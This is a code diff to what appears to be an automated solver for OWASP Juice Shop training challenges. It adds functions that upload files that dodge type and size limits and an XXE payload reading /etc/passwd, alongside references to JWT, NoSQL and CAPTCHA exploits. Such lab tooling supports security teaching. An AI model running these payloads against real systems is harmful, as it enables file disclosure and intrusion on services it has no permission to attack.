@@ -442,6 +442,41 @@ def s_captcha_bypass(sess: Session):
     return last in (200, 201)
 
 
+def _upload(sess: Session, filename, content, field="file"):
+    boundary = "----pentasterBoundary1234"
+    if isinstance(content, str):
+        content = content.encode()
+    body = (
+        f"--{boundary}\r\n"
+        f'Content-Disposition: form-data; name="{field}"; filename="{filename}"\r\n'
+        f"Content-Type: application/octet-stream\r\n\r\n"
+    ).encode() + content + f"\r\n--{boundary}--\r\n".encode()
+    return sess.req("POST", "/file-upload",
+                    headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
+                    data=body, raw=True)
+
+
+def s_upload_type(sess: Session):
+    """Upload Type — fichier sans extension .pdf/.zip."""
+    st, _ = _upload(sess, "pentaster.txt", "not a pdf")
+    return st in (200, 204, 410, 500)
+
+
+def s_upload_size(sess: Session):
+    """Upload Size — fichier > 100 kB."""
+    st, _ = _upload(sess, "big.pdf", b"A" * 150000)
+    return st in (200, 204, 410, 500)
+
+
+def s_xxe_data_access(sess: Session):
+    """XXE Data Access — entité externe lisant /etc/passwd via upload XML."""
+    xml = ('<?xml version="1.0" encoding="UTF-8"?>'
+           '<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
+           '<root>&xxe;</root>')
+    st, txt = _upload(sess, "xxe.xml", xml)
+    return st in (200, 410, 500) or "root:" in txt
+
+
 def s_login_bjoern(sess: Session):
     """Login Bjoern — mot de passe = base64 de l'email inversé."""
     email = "bjoern.kimminich@gmail.com"
@@ -535,6 +570,9 @@ SOLVERS: list[tuple[str, Callable[[Session], bool]]] = [
     ("NoSQL DoS", s_nosql_dos),
     ("Unsigned JWT", s_unsigned_jwt),
     ("Multiple Likes", s_multiple_likes),
+    ("Upload Type", s_upload_type),
+    ("Upload Size", s_upload_size),
+    ("XXE Data Access", s_xxe_data_access),
 ]
 
 
